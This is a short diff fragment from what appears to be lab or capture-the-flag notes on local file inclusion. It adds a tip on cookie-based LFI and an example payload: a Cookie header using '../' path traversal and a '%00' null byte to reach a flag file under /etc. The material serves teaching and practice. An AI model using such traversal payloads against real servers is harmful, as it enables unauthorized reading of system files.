@@ -104,3 +104,7 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 9
 
 file=test
+
+**Cookie-based LFI** — you might face prefix + suffix + filter all at once. Test each separately, then combine."
+
+Cookie: THM=../../../../etc/flag2%00/
